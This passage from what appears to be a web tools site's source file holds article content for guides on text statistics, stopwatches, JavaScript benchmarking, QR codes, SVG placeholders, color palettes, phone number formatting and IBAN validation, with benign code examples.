| Property | Obfuscation | Encryption |
|----------|-------------|------------|
| Reversible | Often yes (no key needed) | Yes (with key) |
| Security | Low — security through obscurity | High — mathematical foundation |
| Purpose | Confusion, code protection | Data confidentiality |
| Common tools | Base64, ROT13, minifiers | AES, RSA, bcrypt |

A critical principle: **obfuscation should never replace encryption for security purposes.** It's trivially reversible by anyone with technical knowledge. Using Base64 to "secure" sensitive data is not security — it's security theater.

## Detecting Obfuscated Text

Security analysts often need to identify and reverse obfuscation:
- Base64 strings typically end with \`=\` or \`==\` padding and use A-Z, a-z, 0-9, +, /
- ROT13 can be identified by unusual letter frequencies
- Hex strings contain only 0-9 and A-F
- HTML entity sequences start with \`&\` and end with \`;\`

## Using the String Obfuscator Tool

Enter your text and select an obfuscation method. The tool applies the transformation and shows the result. Options typically include ROT13, Base64, reversed text, leet speak, HTML entity encoding, and URL encoding. Use it for creating puzzles, hiding text from casual viewers, teaching about encoding techniques, or generating creative typographic variations.
`,
  },
  {
    slug: 'text-statistics-guide',
    toolPath: '/text-statistics',
    title: 'Text Statistics: Count Words, Characters, Sentences, and Reading Time',
    description: 'Analyze any text with our statistics tool. Count words, characters, sentences, paragraphs, and estimate reading time.',
    keywords: ['word counter', 'character counter', 'text statistics', 'reading time estimator', 'text analysis'],
    category: 'Text',
    publishedAt: '2025-08-03',
    content: `## What Are Text Statistics?

Text statistics provide quantitative measurements about a body of text: word count, character count, sentence count, reading time, readability scores, and frequency analysis. These metrics are valuable for writers, editors, students, SEO specialists, and anyone who needs to understand or report on text characteristics.

## Core Text Metrics

### Word Count
The most fundamental text metric. A "word" is typically defined as a sequence of characters separated by whitespace. Academic and professional contexts vary in counting rules — some exclude articles, some count hyphenated compounds as one word, some handle contractions differently.

Content platforms often have word count requirements:
- Blog posts: typically 1,500-3,000 words for SEO value
- Academic papers: specified by institution or journal
- Novel manuscripts: typically 80,000-100,000 words
- Short stories: 1,000-15,000 words

### Character Count
Can be measured with or without spaces. Important for:
- Social media (Twitter's 280-character limit)
- SMS messages (160 characters before multi-part)
- Database column lengths
- Meta descriptions (155-160 characters for SEO)
- Title tags (50-60 characters for SEO)

### Sentence Count and Average Sentence Length
Longer sentences are harder to read. Recommended average sentence length varies by audience:
- General web content: 15-20 words
- Academic writing: up to 25-30 words
- Children's content: under 10 words

### Paragraph Count and Structure
Paragraph length affects readability, especially on screens. Web content typically benefits from shorter paragraphs (3-5 sentences) to create visual breathing room and support scanning.

## Readability Scores

### Flesch Reading Ease
Scale from 0-100, where higher scores indicate easier reading:
- 90-100: Very easy (4th grade)
- 70-80: Easy (6th grade)
- 60-70: Standard (8th-9th grade)
- 50-60: Fairly difficult (10th-12th grade)
- 0-30: Very difficult (college/professional)

### Flesch-Kincaid Grade Level
Translates readability to US school grade level. Calculated from average sentence length and average syllables per word.

### Gunning Fog Index
Emphasizes complex words (3+ syllables). Especially useful for business writing — many corporate documents score 15-20 when the recommendation is 12 or below.

### SMOG Grade
Simple Measure of Gobbledygook. Counts polysyllabic words to estimate the education needed to understand the text.

## Word Frequency Analysis

Analyzing which words appear most frequently reveals:
- **SEO keyword density**: Ensure target keywords appear naturally but not excessively (1-3% is typically appropriate)
- **Topic focus**: Most frequent content words should match the article's claimed topic
- **Style issues**: Overused words that could be varied for more interesting writing
- **Stop words**: Common words (the, and, is, in) that don't convey meaning and should typically be excluded from frequency analysis

## Reading Time Estimation

Average adult reading speeds:
- Silent reading: 200-250 words per minute
- Professional reading: 250-300 words per minute
- Speed reading: 400+ words per minute

Most reading time estimators use 200-250 words per minute. A 1,500-word article takes approximately 6-7 minutes to read.

## Practical Applications

### Content Marketing
SEO best practices recommend certain article lengths for competitive rankings. Text statistics help writers hit target word counts without padding.

### Academic Writing
Assignments specify minimum and maximum lengths. Statistics tools track progress without manually counting.

### Editing
Objective metrics identify sentences that are too long, paragraphs that run on, and readability issues that subjective editing might miss.

## Using the Text Statistics Tool

Our tool provides:
1. **Instant statistics** as you type or paste text
2. **Multiple readability scores** including Flesch, Gunning Fog, and SMOG
3. **Word frequency table** with the top most-common words
4. **Estimated reading time** based on configurable reading speed
5. **Character counts** with and without spaces and punctuation
6. **Paragraph and sentence breakdown** for structural analysis

Paste your draft to get an immediate readability assessment and identify areas that need simplification or expansion.
`,
  },

  // ─── Measurement ──────────────────────────────────────────────
  {
    slug: 'chronometer-guide',
    toolPath: '/chronometer',
    title: 'Online Chronometer: How to Time Events and Record Laps',
    description: 'Use our online stopwatch/chronometer to time tasks, record lap times, and track elapsed time precisely.',
    keywords: ['chronometer online', 'stopwatch online', 'lap timer', 'online timer', 'elapsed time'],
    category: 'Measurement',
    publishedAt: '2025-08-05',
    content: `## Chronometer, Stopwatch, and Timer: What's the Difference?

These three time-measurement tools serve related but distinct purposes:

- **Chronometer**: A precision timekeeping instrument. Measures elapsed time from a start point with high accuracy. Historically refers to marine chronometers used for celestial navigation.
- **Stopwatch**: Records elapsed time, can be paused and resumed, often includes lap functionality.
- **Timer**: Counts down from a set time to zero, often with an alarm. Used for time-boxing tasks.

Our chronometer functions as a high-precision stopwatch with lap recording capability.

## How Computer Timing Works

### The Performance API
Modern browsers provide the \`Performance.now()\` API for high-resolution timing:

\`\`\`javascript
const start = performance.now();
// ... measured operation ...
const elapsed = performance.now() - start;
// elapsed is in milliseconds, with sub-millisecond precision
\`\`\`

Unlike \`Date.now()\` (millisecond precision, affected by system clock changes), \`performance.now()\` is a monotonic clock with microsecond resolution, perfect for stopwatch applications.

### JavaScript Event Loop Limitations
JavaScript runs in a single-threaded event loop. Visual updates happen through \`requestAnimationFrame\` at 60fps (approximately 16.7ms intervals). For a smooth, accurate display, the chronometer updates visually every frame while tracking time with high-resolution timestamps.

## Lap and Split Times

Most professional stopwatches support two timing modes:

### Lap Mode
Records the time for each individual segment:
- Lap 1: 0:45.32
- Lap 2: 0:47.18 (this lap only)
- Lap 3: 0:44.95 (this lap only)

Used in athletics to track pace consistency across repetitions.

### Split Mode
Records cumulative time at each checkpoint:
- Split 1: 0:45.32
- Split 2: 1:32.50 (total elapsed at checkpoint 2)
- Split 3: 2:17.45 (total elapsed at checkpoint 3)

Used in races to track overall pace relative to goals.

## Practical Applications

### Sports Training
- Interval training: Time work and rest periods precisely
- Pace tracking: Measure lap times to ensure consistent pace
- Personal records: Accurately capture times for comparison

### Productivity and Time Management
- Pomodoro technique: 25-minute focused work intervals
- Time auditing: Measure how long specific tasks actually take
- Meeting time-boxing: Hold discussions to agreed durations

### Development and Testing
- Manual performance benchmarking
- Tracking time for code reviews or testing sessions
- Measuring user workflow completion times

### Cooking and Science
- Timing chemical reactions or cooking processes
- Measuring intervals between events in experiments

## Time Display Formats

Chronometers typically display in HH:MM:SS.ms format:
- Hours: Relevant for long runs or endurance events
- Minutes: The primary unit for most applications
- Seconds: Core precision unit
- Milliseconds: Important for athletics and precise measurement

For sub-second sports (swimming, sprinting), hundredths or thousandths of seconds determine race outcomes.

## Using the Chronometer Tool

Our tool provides:
1. **Start/Stop** — Begin and pause timing with a single button
2. **Lap recording** — Record lap or split times without stopping
3. **Reset** — Clear all measurements and return to zero
4. **Lap table** — View all recorded laps with individual and cumulative times
5. **Export** — Copy lap data as text for analysis
6. **Keyboard shortcuts** — Space to start/stop, L for lap, R for reset

The chronometer maintains accuracy even when the browser tab is backgrounded, using \`performance.now()\` for reliable timing regardless of display refresh rate.
`,
  },
  {
    slug: 'benchmark-builder-guide',
    toolPath: '/benchmark-builder',
    title: 'JavaScript Benchmark Builder: Test and Compare Code Performance',
    description: 'Build and run JavaScript performance benchmarks in your browser. Compare multiple code snippets with ops/sec measurements.',
    keywords: ['benchmark builder', 'JavaScript performance', 'code benchmark', 'performance testing', 'ops per second'],
    category: 'Measurement',
    publishedAt: '2025-08-06',
    content: `## What Is Performance Benchmarking?

Performance benchmarking measures the execution speed of code to compare implementations, identify bottlenecks, and guide optimization decisions. A benchmark runs code repeatedly and reports statistical measures of execution time.

## Why Benchmark Code?

Micro-benchmarks help you:
- **Compare algorithm implementations**: Is quicksort or mergesort faster for your use case?
- **Choose between library functions**: Is \`Array.map()\` or a \`for\` loop faster for your data size?
- **Validate optimizations**: Did your "optimization" actually improve performance?
- **Understand scaling**: How does performance change as data size grows?
- **Set performance budgets**: Document expected performance characteristics

## The Benchmark Setup-Test-Teardown Pattern

A well-structured benchmark has three phases:

\`\`\`javascript
// Setup: Prepare data and state (not measured)
const data = generateLargeArray(10000);

// Test: The measured code (run many times)
function testCase() {
  return data.filter(x => x > 500).map(x => x * 2);
}

// Teardown: Cleanup (not measured)
data = null;
\`\`\`

The setup phase ensures the benchmark measures only the relevant code, not initialization costs.

## Statistical Considerations

### Why Run Multiple Iterations?
A single measurement is meaningless — JavaScript engines vary, garbage collection pauses occur, OS scheduling interrupts execution. Running thousands of iterations and calculating statistics gives reliable results.

### Key Statistical Measures
- **Mean**: Average execution time across all runs
- **Median**: Middle value — less affected by outliers than mean
- **Standard Deviation**: Measures variability — low SD means consistent results
- **Min/Max**: Fastest and slowest observed runs
- **Operations per Second (ops/sec)**: How many times the function can run per second

### Margin of Error
A benchmark that shows "Function A: 1.2M ops/sec ± 3%" means the true value is likely between 1.164M and 1.236M ops/sec. If two functions' ranges overlap, they're statistically equivalent.

## JavaScript Engine Optimizations

Modern JavaScript engines (V8, SpiderMonkey) have sophisticated optimization pipelines that complicate benchmarking:

### JIT Compilation
JavaScript is Just-In-Time compiled. The first runs of a function are slow (interpreted), then the engine profiles "hot" functions and compiles them to native machine code. Benchmark libraries handle this by warming up functions before measuring.

### Dead Code Elimination
If the engine detects a function's result is never used, it may optimize away the work entirely, giving misleadingly fast results. Always use the result of benchmarked code.

### Inline Caches
The engine caches type information to speed repeated operations. Benchmarks with consistent types may be unrealistically fast if production code uses mixed types.

## Popular JavaScript Benchmark Libraries

### Benchmark.js
The classic choice, used by jsPerf.com:
\`\`\`javascript
var suite = new Benchmark.Suite;
suite
  .add('RegExp#test', function() {
    /o/.test('Hello World!');
  })
  .add('String#indexOf', function() {
    'Hello World!'.indexOf('o') > -1;
  })
  .run({ async: true });
\`\`\`

### tinybench
Lightweight modern alternative with async support and TypeScript types.

### Vitest bench
Built into Vitest for developers already using the Vitest testing framework.

## Macro vs. Micro Benchmarks

### Micro-Benchmarks
Test a single function or operation in isolation. Fast to run, easy to understand, but may not reflect production conditions due to JIT and cache warmup effects.

### Macro-Benchmarks
Test complete workflows or features in realistic conditions. Slower to run but more representative of real-world performance.

For most development decisions, micro-benchmarks on the specific operation you're optimizing are sufficient.

## Using the Benchmark Builder Tool

Our tool provides:
1. **Multiple test cases** — Add and compare several implementations simultaneously
2. **Setup/teardown code** — Initialize shared state without affecting measurements
3. **Iteration control** — Configure how many times each test runs
4. **Live results** — See operations per second and relative performance
5. **Statistical data** — View mean, median, and margin of error
6. **Copy results** — Share benchmark results as formatted text

Write your competing implementations, click Run, and get immediate, statistically valid performance comparisons.
`,
  },

  // ─── Images ───────────────────────────────────────────────────
  {
    slug: 'qr-code-generator-guide',
    toolPath: '/qrcode-generator',
    title: 'QR Code Generator: Everything You Need to Know',
    description: 'Generate QR codes for URLs, text, contact info. Learn about error correction, sizes, and best practices.',
    keywords: ['QR code generator', 'generate QR code', 'QR code online', 'free QR code', 'QR code for URL'],
    category: 'Images and videos',
    publishedAt: '2025-08-10',
    content: `## What Is a QR Code?

A **QR Code** (Quick Response Code) is a two-dimensional barcode that can store data — URLs, text, contact information, payment details — and be read by any smartphone camera. Invented in 1994 by Denso Wave (a Toyota subsidiary) for tracking automotive parts, QR codes have become universal communication bridges between physical and digital worlds.

## QR Code Structure

A QR code consists of several functional areas:

### Finder Patterns
The three square patterns in corners allow scanners to detect the code's position and orientation from any angle, at any distance.

### Alignment Patterns
Additional smaller patterns (in larger QR codes) allow accurate reading even when the code is slightly distorted or on a curved surface.

### Timing Patterns
Alternating black and white modules that help determine the coordinate system and size of the code.

### Data Modules
The remaining cells encode the actual data along with error correction information.

## Error Correction Levels

QR codes support four error correction levels, allowing codes to be read even when partially damaged:

| Level | Data Recovery | Use Case |
|-------|--------------|----------|
| L (Low) | 7% | Clean environments, maximize data capacity |
| M (Medium) | 15% | General purpose |
| Q (Quartile) | 25% | Industrial environments |
| H (High) | 30% | High damage risk, allows logo overlay |

Higher error correction means more redundant data but larger code size. For codes with logo overlays (which intentionally obscure part of the code), use Level H.

## QR Code Data Types

QR codes can encode different types of data optimized for efficiency:

### URL
The most common use — encode any web URL. Include the \`https://\` prefix for automatic opening in browsers.

### Wi-Fi Credentials
Format: \`WIFI:T:WPA;S:NetworkName;P:Password;;\`
Allows automatic network joining by scanning.

### Contact Information (vCard)
Shares complete contact details in a single scan, including name, phone, email, and address.

### Plain Text
Any text up to approximately 3KB (at low error correction) can be stored.

### Email and SMS
Pre-populates email compose or SMS with recipient and content.

### Geographic Coordinates
Opens maps application at specific latitude/longitude.

## QR Code Versions and Capacity

QR codes come in 40 versions, from 21x21 pixels (Version 1) to 177x177 pixels (Version 40). Larger versions store more data:

| Version | Grid Size | Numeric | Alphanumeric | Binary |
|---------|-----------|---------|-------------|--------|
| 1 | 21x21 | 41 | 25 | 17 |
| 5 | 37x37 | 154 | 93 | 64 |
| 10 | 57x57 | 440 | 267 | 174 |
| 40 | 177x177 | 7,089 | 4,296 | 2,953 |

For URL QR codes, keep URLs short for best scanning reliability.

## QR Code Design Best Practices

### Size
- Minimum: 2cm x 2cm for scanning at arm's length
- For print: At least 300 DPI
- Add quiet zone: White border equal to 4 module widths

### Color
- High contrast required: dark modules on light background
- Inverted (light on dark) works but less reliably
- Avoid low-contrast combinations like dark blue on black

### Logo Overlay
Logos can be added in the center (using H error correction) covering up to 30% of the code. A common branding technique on marketing materials.

### Testing
Always test with multiple devices and scanners before printing. Test at actual size, not just on screen.

## Common Use Cases

- **Marketing**: Link printed materials to digital content
- **Restaurant menus**: Contactless menu access (popularized during COVID-19)
- **Event tickets**: Digital ticketing and entry verification
- **Product authentication**: Anti-counterfeiting verification
- **Business cards**: Quick contact information sharing
- **Payments**: WeChat Pay, PayPal, bank payment codes
- **App store links**: Direct links to iOS App Store or Google Play

## Using the QR Code Generator

Our tool:
1. **Enter any URL or text** in the input field
2. **Choose error correction level** based on your use case
3. **Customize appearance** — adjust colors and add quiet zone
4. **Preview** the generated QR code instantly
5. **Download** as SVG (scalable) or PNG (for specific sizes)

The SVG format is ideal for print — it scales to any size without pixelation.
`,
  },
  {
    slug: 'svg-placeholder-guide',
    toolPath: '/svg-placeholder-generator',
    title: 'SVG Placeholder Images: Generate Customizable Placeholders',
    description: 'Create SVG placeholder images with custom sizes, colors, and text for mockups, wireframes, and development.',
    keywords: ['SVG placeholder', 'placeholder image generator', 'dummy image', 'placeholder image online', 'image placeholder'],
    category: 'Images and videos',
    publishedAt: '2025-08-11',
    content: `## What Is an SVG Placeholder?

An SVG placeholder is a lightweight vector image used as a temporary visual while the real image loads, as a default fallback when no image is available, or as a deliberately simple design element. SVG (Scalable Vector Graphics) placeholders are preferred over raster placeholders because they scale perfectly at any size and are typically just a few hundred bytes.

## Why Use SVG Placeholders?

### Image Loading Performance
Large images slow page loads. Techniques that improve perceived performance:

**LQIP (Low-Quality Image Placeholder)**: Show a tiny, blurred version of the actual image while the full version loads. Creates a smooth loading experience.

**Skeleton screens**: Show the layout structure with gray placeholder shapes before content arrives. Used extensively by Facebook, LinkedIn, and YouTube.

**Dominant color**: Extract the most prominent color from an image and use it as a solid-color placeholder, creating visual continuity.

### Development and Testing
When building UIs before real content exists, SVG placeholders:
- Show image dimensions without requiring real images
- Display dimensions, file type, or ID as text within the placeholder
- Use consistent visual language across development environments

### Error States
When an image fails to load, show a meaningful placeholder instead of a broken image icon:
\`\`\`html
<img src="photo.jpg" 
     onerror="this.src='placeholder.svg'"
     alt="User photo" />
\`\`\`

## SVG Placeholder Formats

### Solid Color with Text
\`\`\`svg
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300">
  <rect width="100%" height="100%" fill="#CCCCCC"/>
  <text x="50%" y="50%" text-anchor="middle" dy=".35em" 
        font-family="sans-serif" fill="#666">400x300</text>
</svg>
\`\`\`

### Gradient Background
More visually appealing placeholder that suggests depth and texture without additional weight.

### Icon-based
Common placeholder patterns include person silhouettes for avatar placeholders, landscape icons for photo placeholders, and document icons for file type indicators.

### Blur Hash
WASM-based technique that encodes a tiny perceptual hash of an image. The hash can be rendered as a blurred placeholder that matches the color palette of the eventual image.

## Using SVG Placeholders in CSS

### Background Image
\`\`\`css
.product-image {
  background-image: url("data:image/svg+xml,...");
  background-size: cover;
  width: 300px;
  height: 200px;
}
\`\`\`

### Lazy Loading with IntersectionObserver
\`\`\`javascript
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const img = entry.target;
      img.src = img.dataset.src;
      observer.unobserve(img);
    }
  });
});

document.querySelectorAll('img[data-src]').forEach(img => observer.observe(img));
\`\`\`

## Aspect Ratio Preservation

A key challenge with image placeholders is preventing layout shift (CLS — Cumulative Layout Shift). The SVG viewBox attribute and CSS padding-bottom hack both solve this:

\`\`\`css
/* Aspect ratio placeholder (16:9) */
.image-wrapper {
  position: relative;
  padding-bottom: 56.25%; /* 9/16 = 0.5625 */
  overflow: hidden;
}
.image-wrapper img {
  position: absolute;
  width: 100%;
  height: 100%;
  object-fit: cover;
}
\`\`\`

## Common Placeholder Services

Several online services generate placeholder images on demand:
- **placeholder.com**: \`https://via.placeholder.com/400x300\`
- **placehold.co**: \`https://placehold.co/400x300\`
- **picsum.photos**: \`https://picsum.photos/400/300\` (random real photos)
- **dummyimage.com**: Customizable size, color, and text

## Using the SVG Placeholder Generator

Our tool:
1. **Set dimensions** — width and height in pixels
2. **Choose background color** — solid or gradient options
3. **Add text** — size label, custom message, or empty
4. **Select style** — plain, dotted, striped, or icon-based
5. **Get SVG code** — copy raw SVG for embedding
6. **Get data URL** — copy as base64 data URL for CSS/HTML

Generated placeholders are minimal and render instantly, making them ideal for development environments and production fallback states.
`,
  },
  {
    slug: 'color-palette-generator-guide',
    toolPath: '/color-palette-generator',
    title: 'Color Palette Generator: Create Beautiful Color Schemes',
    description: 'Generate harmonious color palettes for design projects. Learn color theory: complementary, analogous, and triadic schemes.',
    keywords: ['color palette generator', 'color scheme generator', 'color theory', 'complementary colors', 'design colors'],
    category: 'Images and videos',
    publishedAt: '2025-08-12',
    content: `## Color Theory Fundamentals

A color palette is a curated set of colors that work harmoniously together. Understanding color theory principles helps create palettes that are visually pleasing, accessible, and appropriate for their context.

## Color Models

### RGB (Red, Green, Blue)
The additive color model used by screens. Colors are created by combining light:
- \`rgb(255, 0, 0)\` — Pure red
- \`rgb(0, 0, 255)\` — Pure blue
- \`rgb(255, 255, 255)\` — White (all colors combined)
- \`rgb(0, 0, 0)\` — Black (no light)

### HSL (Hue, Saturation, Lightness)
More intuitive for color manipulation:
- **Hue**: The color angle on the color wheel (0-360°, where 0=red, 120=green, 240=blue)
- **Saturation**: Color intensity (0% = gray, 100% = full color)
- **Lightness**: Brightness (0% = black, 50% = normal, 100% = white)

HSL is preferred for programmatically adjusting colors because changing saturation or lightness doesn't shift the hue.

### CMYK (Cyan, Magenta, Yellow, Key/Black)
The subtractive color model used in printing. Colors are created by absorbing light. Designs for print must be converted from RGB to CMYK, often with noticeable color shifts.

## Color Harmony Types

### Complementary Colors
Colors opposite each other on the color wheel. High contrast, vibrant combinations.
- Example: Blue (#0000FF) and Orange (#FF7F00)
- Best for: Call-to-action elements, sports teams, logos needing high visibility

### Analogous Colors
Adjacent colors on the wheel. Harmonious, natural-looking palettes.
- Example: Blue, Blue-Green, Green
- Best for: Nature themes, calm environments, professional services

### Triadic Colors
Three colors equally spaced on the wheel (120° apart).
- Example: Red, Yellow, Blue
- Best for: Vibrant, energetic designs; children's products; playful brands

### Split-Complementary
A base color plus two colors adjacent to its complement. Less tension than complementary, more contrast than analogous.

### Tetradic (Square/Rectangle)
Four colors forming a square or rectangle on the wheel. Rich palettes but challenging to balance.

### Monochromatic
Variations of a single hue through different tints (lighter), shades (darker), and tones (mixed with gray). Sophisticated, elegant, never clashes.

## Building a Practical UI Color Palette

A complete design system color palette includes:

### Primary Colors (Brand Colors)
1-3 core brand colors. Should work well on white and dark backgrounds.

### Neutral Colors
Grays for text, backgrounds, borders, and dividers. Typically 8-10 shades from near-white to near-black.

### Semantic Colors
- **Success**: Green variants
- **Warning**: Yellow/amber variants
- **Error**: Red variants
- **Info**: Blue variants

### Accent Colors
Optional accent colors for highlights, badges, and special UI elements.

## Accessibility: Color Contrast

WCAG 2.1 (Web Content Accessibility Guidelines) requires:
- Normal text: 4.5:1 contrast ratio minimum (AA standard)
- Large text (18pt+ or 14pt+ bold): 3:1 minimum
- Non-text UI components: 3:1 minimum
- AAA standard: 7:1 for normal text

Contrast ratio is calculated from the relative luminance of foreground and background colors. Tools like the WebAIM Contrast Checker verify compliance.

Never rely on color alone to convey meaning — always pair with icons, text, or patterns for color-blind accessibility.

## Color Psychology

Colors carry cultural and psychological associations:
- **Red**: Urgency, passion, danger, excitement
- **Blue**: Trust, calm, professionalism, technology
- **Green**: Nature, growth, health, money
- **Yellow**: Optimism, warmth, caution, energy
- **Purple**: Luxury, creativity, mystery
- **Orange**: Enthusiasm, creativity, warmth
- **White**: Cleanliness, simplicity, space
- **Black**: Sophistication, power, elegance

## Using the Color Palette Generator

Our tool:
1. **Input a base color** — hex, RGB, or HSL
2. **Choose harmony type** — complementary, analogous, triadic, etc.
3. **Generate the palette** — instantly creates matching colors
4. **View in context** — preview colors on sample UI components
5. **Adjust shades** — generate light/dark variants for each palette color
6. **Copy in any format** — hex, RGB, HSL, CSS variables, or design token JSON
7. **Check contrast** — validate all color pairs against WCAG standards

Use it to build consistent, accessible, and beautiful color systems for your projects.
`,
  },

  // ─── Data ─────────────────────────────────────────────────────
  {
    slug: 'phone-formatter-guide',
    toolPath: '/phone-parser-and-formatter',
    title: 'Phone Number Formatting: Parse, Format, and Validate International Numbers',
    description: 'Parse and format international phone numbers. Learn about E.164 format, country codes, and validation.',
    keywords: ['phone number formatter', 'E.164 format', 'international phone number', 'phone validator', 'country code'],
    category: 'Data',
    publishedAt: '2025-08-15',
    content: `## International Phone Number Standards

Phone numbers vary enormously across countries in length, format, and routing. The **E.164 standard** (ITU-T recommendation) provides a universal format for international phone numbers used in telecommunications systems worldwide.

## E.164 Format

The E.164 international phone number format:
\`\`\`
+[country code][area code][subscriber number]
\`\`\`

Requirements:
- Starts with \`+\` (international prefix)
- Maximum 15 digits total (excluding the \`+\`)
- No spaces, dashes, or parentheses

Examples:
- US number: \`+12125551234\` (country code 1, area code 212)
- UK number: \`+442071234567\` (country code 44)
- Japan: \`+81312345678\` (country code 81)

E.164 is used by SMS gateways, VoIP systems, CRM platforms, and telephony APIs like Twilio.

## National vs. International Format

The same number can appear very differently in national vs. international format:

| Country | National Format | International (E.164) |
|---------|----------------|----------------------|
| USA | (800) 555-0100 | +18005550100 |
| UK | 020 7946 0958 | +442079460958 |
| Germany | 030 12345678 | +493012345678 |
| France | 01 23 45 67 89 | +33123456789 |
| Australia | (02) 1234 5678 | +61212345678 |
| Japan | 03-1234-5678 | +81312345678 |

Note: National formats often omit the country code and use local area code notation with various separators.

## Country Codes Reference

Common international dialing codes (country calling codes):
- +1: USA, Canada, and Caribbean countries
- +7: Russia and Kazakhstan
- +20: Egypt
- +27: South Africa
- +33: France
- +34: Spain
- +44: United Kingdom
- +49: Germany
- +55: Brazil
- +61: Australia
- +81: Japan
- +82: South Korea
- +86: China
- +91: India
- +971: United Arab Emirates

## Phone Number Validation

Validating phone numbers is more complex than it appears:

### Basic Format Validation
\`\`\`javascript
// Simple regex for E.164 format
const e164Regex = /^\\+[1-9]\\d{1,14}$/;
e164Regex.test('+12125551234'); // true
\`\`\`

### libphonenumber
Google's libphonenumber library provides comprehensive validation using country-specific rules:
\`\`\`javascript
// Using libphonenumber-js
import { parsePhoneNumber } from 'libphonenumber-js';
const phone = parsePhoneNumber('+12125551234');
phone.isValid(); // true
phone.country; // 'US'
phone.formatInternational(); // '+1 212 555 1234'
phone.formatNational(); // '(212) 555-1234'
\`\`\`

libphonenumber knows the valid number patterns for every country and validates not just format but whether the specific number could actually exist.

## Phone Number Types

- **Geographic**: Fixed-line numbers tied to a location
- **Mobile**: Cell phone numbers
- **Toll-free**: 800/888/877 in the US; free to call
- **Premium rate**: Revenue-sharing numbers
- **VoIP**: Internet-based phone numbers
- **Short code**: 5-6 digit numbers for SMS services

The type affects validation rules and expected length.

## Storing Phone Numbers in Databases

Best practices:
1. **Always store in E.164 format**: Canonical, unambiguous, searchable
2. **Store as VARCHAR/TEXT**: Not as integer (leading zeros, + sign)
3. **Store original input separately**: If you need to display as entered
4. **Normalize on input**: Validate and convert to E.164 at registration

\`\`\`sql
-- Good: E.164 stored as text
CREATE TABLE contacts (
  id SERIAL PRIMARY KEY,
  phone_e164 VARCHAR(16),  -- +12125551234
  phone_display VARCHAR(30) -- (212) 555-1234
);
\`\`\`

## Using the Phone Parser and Formatter

Our tool:
1. **Parse any phone number format** — handles parentheses, dashes, spaces, dots
2. **Detect country** — identifies country from calling code
3. **Validate the number** — checks against country-specific rules
4. **Convert formats** — display in E.164, international, or national format
5. **Show number type** — geographic, mobile, toll-free, etc.
6. **Batch processing** — parse multiple numbers at once from a CSV

Use it for standardizing phone numbers before database import, validating user input, and reformatting contact lists.
`,
  },
  {
    slug: 'iban-validator-guide',
    toolPath: '/iban-validator-and-parser',
    title: 'IBAN Validator: How to Verify International Bank Account Numbers',
    description: 'Validate and parse IBAN numbers. Learn the IBAN structure, country formats, and how checksum validation works.',
    keywords: ['IBAN validator', 'IBAN checker', 'international bank account', 'IBAN format', 'IBAN checksum'],
    category: 'Data',
    publishedAt: '2025-08-16',
    content: `## What Is an IBAN?

**IBAN** (International Bank Account Number) is a standardized international system for identifying bank accounts, developed by the European Committee for Banking Standards (ECBS) and adopted by ISO as ISO 13616. Originally created to simplify EU cross-border transfers, IBAN is now used by over 77 countries.

## IBAN Structure

An IBAN consists of up to 34 alphanumeric characters:

\`\`\`
[Country Code (2)] [Check Digits (2)] [Basic Bank Account Number (BBAN, up to 30 chars)]
\`\`\`

Example — German IBAN:
\`\`\`
DE89 3704 0044 0532 0130 00
DE   = Country code (Germany)
89   = Check digits (validates the IBAN)
3704 0044 0532 0130 00 = BBAN (national account number)
\`\`\`

Example — UK IBAN:
\`\`\`
GB29 NWBK 6016 1331 9268 19
GB   = Country code (United Kingdom)
29   = Check digits
NWBK = Sort code prefix / bank identifier
6016 13 = Sort code
31926819 = Account number
\`\`\`

## How IBAN Validation Works

### The MOD-97-10 Algorithm
IBAN validation uses modulo-97 arithmetic:

1. Move the first four characters to the end: \`3704 0044 0532 0130 00 DE89\` becomes \`3704004405320130 00 DE89\`
2. Replace letters with numbers: A=10, B=11, ..., Z=35. \`D\`=13, \`E\`=14 → \`37040044053201300013148 9\`
3. Compute the number mod 97
4. If the result equals 1, the IBAN is valid

### What Validation Proves
- The IBAN passes the check digit algorithm
- The country code is recognized
- The BBAN length matches the country's expected length

What validation does NOT prove:
- The account actually exists
- The account belongs to the named person
- The transfer will succeed

## IBAN Country Formats

Each country has a specific BBAN format and total IBAN length:

| Country | Length | Example |
|---------|--------|---------|
| Germany (DE) | 22 | DE89 3704 0044 0532 0130 00 |
| France (FR) | 27 | FR76 3000 6000 0112 3456 7890 189 |
| Netherlands (NL) | 18 | NL91 ABNA 0417 1643 00 |
| Spain (ES) | 24 | ES91 2100 0418 4502 0005 1332 |
| Italy (IT) | 27 | IT60 X054 2811 1010 0000 0123 456 |
| Switzerland (CH) | 21 | CH93 0076 2011 6238 5295 7 |
| UK (GB) | 22 | GB29 NWBK 6016 1331 9268 19 |
| UAE (AE) | 23 | AE07 0331 2345 6789 0123 456 |

## IBAN vs. SWIFT/BIC

IBAN identifies the **account**; SWIFT/BIC identifies the **bank**:

\`\`\`
BIC/SWIFT: NWBKGB2L
  NWBK = Bank code (NatWest)
  GB   = Country code
  2L   = Location code
\`\`\`

International transfers typically require both:
- **IBAN**: Where the money goes (account)
- **SWIFT/BIC**: How to route it (bank)

## SEPA Transfers

The Single Euro Payments Area (SEPA) covers 36 European countries. SEPA transfers:
- Use only IBAN (no SWIFT/BIC required within SEPA since 2016)
- Are processed within 1 business day (SEPA Credit Transfer)
- Include instant payments up to €100,000 (SEPA Instant)
- Are free or low-cost within the Eurozone

## Common IBAN Errors

### Wrong Check Digits
Manually typed IBANs often have transposition errors. The check digit catches most single-character errors.

### Incorrect Length
A German IBAN must be exactly 22 characters. Extra or missing digits cause immediate validation failure.

### Formatting Issues
IBANs are often displayed in groups of 4 for readability (\`DE89 3704 0044\`) but transmitted without spaces. Validation tools should accept both formats.

## Using the IBAN Validator

Our tool:
1. **Enter any IBAN** — accepts spaces and uppercase/lowercase
2. **Validates format** — checks country code, length, and check digits
3. **Parses structure** — shows bank code, branch code, account number
4. **Identifies country** — full country name from ISO code
5. **Explains errors** — clear messages for invalid IBANs

Use it before processing international payments to catch data entry errors and prevent failed transfers.
`,
  },
  {
    slug: 'json-to-csv-guide',
    toolPath: '/json-to-csv',
    title: 'JSON to CSV Converter: Export Data for Spreadsheets',
    description: 'Convert JSON arrays to CSV format for use in Excel, Google Sheets, and data analysis tools.',
    keywords: ['JSON to CSV', 'convert JSON CSV', 'JSON export', 'JSON spreadsheet', 'CSV converter'],
    category: 'Development',
    publishedAt: '2025-08-17',
    content: `## Why Convert JSON to CSV?

JSON is the de facto standard for web APIs and configuration, while CSV (Comma-Separated Values) is the universal format for spreadsheets, data analysis, and database imports. Converting between them is a fundamental data engineering task.

**When you need JSON-to-CSV:**
